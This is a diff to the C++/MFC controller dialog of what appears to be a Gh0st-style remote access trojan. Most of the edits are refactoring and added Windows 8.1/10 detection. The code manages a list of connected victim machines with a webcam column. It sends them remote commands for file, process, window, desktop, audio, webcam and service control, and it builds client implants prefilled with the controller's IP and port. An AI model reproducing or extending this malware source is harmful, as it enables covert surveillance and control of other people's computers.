@@ -26,7 +26,9 @@
 
 #define UM_ICONNOTIFY WM_USER+100
 
+// 文件对话框数组（因为容易导致程序崩溃而出此策略）
 std::vector<CFileManagerDlg	*> v_FileDlg;
+// 注册表对话框数组（因为容易导致程序崩溃而出此策略）
 std::vector<CRegisterDlg	*> v_RegDlg;
 
 enum
@@ -43,38 +45,37 @@ enum
 
 typedef struct
 {
-	char*   szTitle;           //列表的名称
+	const char*   szTitle;     //列表的名称
 	int		nWidth;            //列表的宽度
 }COLUMNSTRUCT;
 
+const int  g_Column_Count_Online  = 7; // 报表的列数
 
-COLUMNSTRUCT g_Column_Data_Online[] = 
+COLUMNSTRUCT g_Column_Data_Online[g_Column_Count_Online] = 
 {
-	{"IP",			148	},
+	{"IP",				148	},
 	{"端口",			150	},
 	{"计算机名/备注",	160	},
 	{"操作系统",		128	},
-	{"CPU",			80	},
-	{"摄像头",		81	},
-	{"PING",			151	}
+	{"CPU",				80	},
+	{"摄像头",			81	},
+	{"PING",			151	},
 };
 
 // 用于应用程序“关于”菜单项的 CAboutDlg 对话框
-int  g_Column_Count_Online  = 7;
 
-COLUMNSTRUCT g_Column_Data_Message[] = 
+const int g_Column_Count_Message = 3;   // 列表的个数
+
+COLUMNSTRUCT g_Column_Data_Message[g_Column_Count_Message] = 
 {
 	{"信息类型",		200	},
 	{"时间",			200	},
 	{"信息内容",	    490	}
 };
 
-int g_Column_Count_Message = 3;   //列表的个数
-
-
-int g_Column_Online_Width  = 0; 
-int g_Column_Message_Width = 0; 
-IOCPServer *m_iocpServer   = NULL;  
+int g_Column_Online_Width  = 0;
+int g_Column_Message_Width = 0;
+IOCPServer *m_iocpServer   = NULL;
 CMy2015RemoteDlg*  g_2015RemoteDlg = NULL;
 
 static UINT Indicators[] =
@@ -114,8 +115,7 @@ END_MESSAGE_MAP()
 // CMy2015RemoteDlg 对话框
 
 
-CMy2015RemoteDlg::CMy2015RemoteDlg(CWnd* pParent /*=NULL*/)
-	: CDialogEx(CMy2015RemoteDlg::IDD, pParent)
+CMy2015RemoteDlg::CMy2015RemoteDlg(CWnd* pParent): CDialogEx(CMy2015RemoteDlg::IDD, pParent)
 {
 	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
 
@@ -189,17 +189,9 @@ void CMy2015RemoteDlg::OnIconNotify(WPARAM wParam, LPARAM lParam)
 	case WM_LBUTTONDOWN: 
 	case WM_LBUTTONDBLCLK: 
 		{
-			if (!IsWindowVisible())
-			{
-				ShowWindow(SW_SHOW);
-			}
-			else
-			{
-				ShowWindow(SW_HIDE);
-			}
+			ShowWindow(IsWindowVisible() ? SW_HIDE : SW_SHOW);
 			break;
 		}
-
 	case WM_RBUTTONDOWN:
 		{
 			CMenu Menu;
@@ -218,8 +210,7 @@ void CMy2015RemoteDlg::OnIconNotify(WPARAM wParam, LPARAM lParam)
 
 VOID CMy2015RemoteDlg::CreateSolidMenu()
 {
-	HMENU hMenu;   //SDK  C   MFC  C++
-	hMenu = LoadMenu(NULL,MAKEINTRESOURCE(IDR_MENU_MAIN));   //载入菜单资源
+	HMENU hMenu = LoadMenu(NULL,MAKEINTRESOURCE(IDR_MENU_MAIN));   //载入菜单资源
 	::SetMenu(this->GetSafeHwnd(),hMenu);                    //为窗口设置菜单
 	::DrawMenuBar(this->GetSafeHwnd());                      //显示菜单
 }
@@ -317,8 +308,6 @@ VOID CMy2015RemoteDlg::InitControl()
 	}
 
 	m_CList_Message.SetExtendedStyle(LVS_EX_FULLROWSELECT);
-
-	SetTimer(0,3000,NULL); // 定时检查无用的文件对话框
 }
 
 
@@ -352,17 +341,10 @@ VOID CMy2015RemoteDlg::AddList(CString strIP, CString strAddr, CString strPCName
 
 VOID CMy2015RemoteDlg::ShowMessage(BOOL bOk, CString strMsg)
 {
-	CString strIsOK,strTime;
-	CTime Timer =CTime::GetCurrentTime(); //定义一个CTime 类的一个对象 t 使用类中的成员函数GetCurrentTime() 而不是 SDK函数
-	strTime= Timer.Format("%H:%M:%S");
-	if (bOk)
-	{
-		strIsOK="执行成功";
-	}
-	else
-	{
-		strIsOK="执行失败";
-	}
+	CTime Timer = CTime::GetCurrentTime();
+	CString strTime= Timer.Format("%H:%M:%S");
+	CString strIsOK= bOk ? "执行成功" : "执行失败";
+	
 	m_CList_Message.InsertItem(0,strIsOK);    //向控件中设置数据
 	m_CList_Message.SetItemText(0,1,strTime);
 	m_CList_Message.SetItemText(0,2,strMsg);
@@ -548,29 +530,11 @@ void CMy2015RemoteDlg::OnSize(UINT nType, int cx, int cy)
 
 void CMy2015RemoteDlg::OnTimer(UINT_PTR nIDEvent)
 {
-	// TODO: 在此添加消息处理程序代码和/或调用默认值
-	switch(nIDEvent)
-	{
-
-	case 0:
-		{
-			break;
-		}
-
-	case 1:
-		{
-
-			break;
-		}
-	}
 }
 
 
 void CMy2015RemoteDlg::OnClose()
 {
-	// TODO: 在此添加消息处理程序代码和/或调用默认值
-	KillTimer(0);
-
 #if SHOW_NOTIFY
 	Shell_NotifyIcon(NIM_DELETE, &m_Nid);
 #endif
@@ -665,15 +629,13 @@ void CMy2015RemoteDlg::OnOnlineDelete()
 	BYTE bToken = COMMAND_BYE;   //向被控端发送一个COMMAND_SYSTEM
 	SendSelectedCommand(&bToken, sizeof(BYTE));   //Context     PreSending   PostSending
 
-	CString  strIP;
 	int iCount = m_CList_Online.GetSelectedCount();
-	int i = 0;
 
-	for (i=0;i<iCount;++i)
+	for (int i=0;i<iCount;++i)
 	{
 		POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
 		int iItem = m_CList_Online.GetNextSelectedItem(Pos);
-		strIP = m_CList_Online.GetItemText(iItem,ONLINELIST_IP);  
+		CString strIP = m_CList_Online.GetItemText(iItem,ONLINELIST_IP);  
 		m_CList_Online.DeleteItem(iItem);
 		strIP+="断开连接";
 		ShowMessage(true,strIP);
@@ -693,8 +655,6 @@ VOID CMy2015RemoteDlg::OnOnlineProcessManager()
 	SendSelectedCommand(&bToken, sizeof(BYTE));	
 }
 
-
-
 VOID CMy2015RemoteDlg::OnOnlineWindowManager()
 {
 	BYTE	bToken = COMMAND_WSLIST;     
@@ -710,26 +670,25 @@ VOID CMy2015RemoteDlg::OnOnlineDesktopManager()
 
 VOID CMy2015RemoteDlg::OnOnlineFileManager()
 {
-	BYTE	bToken = COMMAND_LIST_DRIVE;  //磁盘卷驱动设备      
-
+	BYTE	bToken = COMMAND_LIST_DRIVE;    
 	SendSelectedCommand(&bToken, sizeof(BYTE));
 }
 
 VOID CMy2015RemoteDlg::OnOnlineAudioManager()
 {
-	BYTE	bToken = COMMAND_AUDIO;                 //向被控端发送命令
+	BYTE	bToken = COMMAND_AUDIO;
 	SendSelectedCommand(&bToken, sizeof(BYTE));
 }
 
 VOID CMy2015RemoteDlg::OnOnlineVideoManager()
 {
-	BYTE	bToken = COMMAND_WEBCAM;                 //向被控端发送命令
+	BYTE	bToken = COMMAND_WEBCAM;
 	SendSelectedCommand(&bToken, sizeof(BYTE));
 }
 
 VOID CMy2015RemoteDlg::OnOnlineServerManager()
 {
-	BYTE	bToken = COMMAND_SERVICES;         //赋值一个宏 然后发送到服务端，到服务端搜索COMMAND_SYSTEM
+	BYTE	bToken = COMMAND_SERVICES;
 	SendSelectedCommand(&bToken, sizeof(BYTE));
 }
 
@@ -743,20 +702,24 @@ void CMy2015RemoteDlg::OnOnlineBuildClient()
 {
 	// TODO: 在此添加命令处理程序代码
 	CBuildDlg Dlg;
+	Dlg.m_strIP = ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetStr("settings", "localIp", "");
+	CString Port;
+	Port.Format("%d", ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetInt("settings", "ghost"));
+	Dlg.m_strPort = Port;
 	Dlg.DoModal();
 }
 
 
 VOID CMy2015RemoteDlg::SendSelectedCommand(PBYTE  szBuffer, ULONG ulLength)
 {
-	POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();   //1[pcontext client]  2  3   //1    2
+	POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
 	while(Pos)
 	{
 		int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
-		CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)m_CList_Online.GetItemData(iItem); //从列表条目中取出ClientContext结构体
+		CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)m_CList_Online.GetItemData(iItem);
 
-		// 发送获得驱动器列表数据包                                                 //查看ClientContext结构体
-		m_iocpServer->OnClientPreSending(ContextObject,szBuffer, ulLength);         //Cleint   Context
+		// 发送获得驱动器列表数据包
+		m_iocpServer->OnClientPreSending(ContextObject,szBuffer, ulLength);
 	} 
 }
 
@@ -769,15 +732,12 @@ VOID CMy2015RemoteDlg::OnAbout()
 //托盘Menu
 void CMy2015RemoteDlg::OnNotifyShow()
 {
-	// TODO: 在此添加命令处理程序代码
 	ShowWindow(SW_SHOW);
 }
 
 
 void CMy2015RemoteDlg::OnNotifyExit()
 {
-	// TODO: 在此添加命令处理程序代码
-
 	SendMessage(WM_CLOSE);
 }
 
@@ -799,9 +759,9 @@ void CMy2015RemoteDlg::OnMainExit()
 
 VOID CMy2015RemoteDlg::ListenPort()
 {
-	int nPort = ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetInt("settings", "ghost");         
+	int nPort = ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetInt("settings", "ghost");
 	//读取ini 文件中的监听端口
-	int nMaxConnection = ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetInt("settings", "MaxConnection");    
+	int nMaxConnection = ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetInt("settings", "MaxConnection");
 	//读取最大连接数
 	if (nPort<=0 || nPort>65535)
 		nPort = 6543;
@@ -1008,7 +968,7 @@ LRESULT CMy2015RemoteDlg::OnUserToOnlineList(WPARAM wParam, LPARAM lParam)
 		switch (LoginInfor->OsVerInfoEx.dwPlatformId)
 		{
 		case VER_PLATFORM_WIN32_NT:
-			if (LoginInfor->OsVerInfoEx.dwMajorVersion <= 4 )
+			if ( LoginInfor->OsVerInfoEx.dwMajorVersion <= 4 )
 				strOS = "WindowsNT";
 			if ( LoginInfor->OsVerInfoEx.dwMajorVersion == 5 && LoginInfor->OsVerInfoEx.dwMinorVersion == 0 )
 				strOS = "Windows2000";
@@ -1022,6 +982,12 @@ LRESULT CMy2015RemoteDlg::OnUserToOnlineList(WPARAM wParam, LPARAM lParam)
 				strOS = "Windows7";
 			if ( LoginInfor->OsVerInfoEx.dwMajorVersion == 6 && LoginInfor->OsVerInfoEx.dwMinorVersion == 2 )
 				strOS = "Windows8";
+			if ( LoginInfor->OsVerInfoEx.dwMajorVersion == 6 && LoginInfor->OsVerInfoEx.dwMinorVersion == 3 )
+				strOS = "Windows8.1";
+			if ( LoginInfor->OsVerInfoEx.dwMajorVersion == 6 && LoginInfor->OsVerInfoEx.dwMinorVersion == 4 )
+				strOS = "Windows10";
+			if ( LoginInfor->OsVerInfoEx.dwMajorVersion == 10 && LoginInfor->OsVerInfoEx.dwMinorVersion == 0 )
+				strOS = "Windows10";
 		}
 
 		//CPU
